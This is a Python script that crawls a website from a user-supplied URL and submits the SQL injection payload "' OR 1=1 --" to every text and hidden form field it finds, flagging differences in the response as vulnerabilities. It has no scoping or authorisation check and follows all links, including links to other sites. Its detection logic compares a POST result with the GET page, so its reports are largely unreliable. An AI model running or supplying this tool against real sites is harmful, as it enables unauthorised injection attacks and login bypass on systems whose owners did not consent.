import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from colorama import init, Fore, Back, Style

# Initialize Colorama for colored console output
init(autoreset=True)

def scan_for_sql_injections():
    # User input for the starting URL
    start_url = input("Enter the starting URL: ")

    # Maximum depth to crawl
    max_depth = int(input("Enter the max depth you want to check: "))

    # Set of visited URLs to avoid revisiting the same page
    visited = set()

    # Stack of URLs to visit, starting with the starting URL
    to_visit = [(start_url, 0)]

    # Depth-first search algorithm to crawl forward
    while to_visit:
        url, depth = to_visit.pop()

        # Skip this URL if it has already been visited or exceeds the maximum depth
        if url in visited or depth > max_depth:
            continue

        try:
            # Make a request to the URL
            response = requests.get(url)

            # Add the URL to the set of visited URLs
            visited.add(url)

            # Check for potential SQL injection vulnerabilities in form fields
            soup = BeautifulSoup(response.content, "html.parser")
            forms = soup.find_all("form")

            for form in forms:
                fields = form.find_all("input")
                payload = "' OR 1=1 --"
                data = {}

                for field in fields:
                    if field.get("type") in ["text", "hidden"]:
                        data[field.get("name")] = payload

                # Send a request with the SQL injection payload and check if it causes a different response
                injection_response = requests.post(urljoin(url, form.get("action")), data=data)

                if injection_response.text != response.text:
                    print(Fore.BLACK + Back.GREEN + f"Possible SQL injection vulnerability detected at {urljoin(url, form.get('action'))}!" + Style.RESET_ALL)
                else:
                    print(Fore.BLACK + Back.RED + f"SQL injection check failed on {urljoin(url, form.get('action'))}" + Style.RESET_ALL)

            # Add the URL to the set of visited URLs
            visited.add(url)

            # Parse the HTML content of the response and find all links on the page
            links = soup.find_all("a")

            # Add any new links to the stack of URLs to visit
            for link in links:
                new_url = urljoin(url, link.get("href"))
                to_visit.append((new_url, depth + 1))

            # Print a message indicating the progress of the scan
            print(Fore.BLACK + Back.YELLOW + f"{len(visited)} pages visited so far..." + Style.RESET_ALL)

        except requests.exceptions.InvalidSchema:
            print(Fore.RED + f"Skipping URL: {url} - Invalid schema")

        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"Error occurred while processing URL: {url} - {str(e)}")


if __name__ == "__main__":
    scan_for_sql_injections()
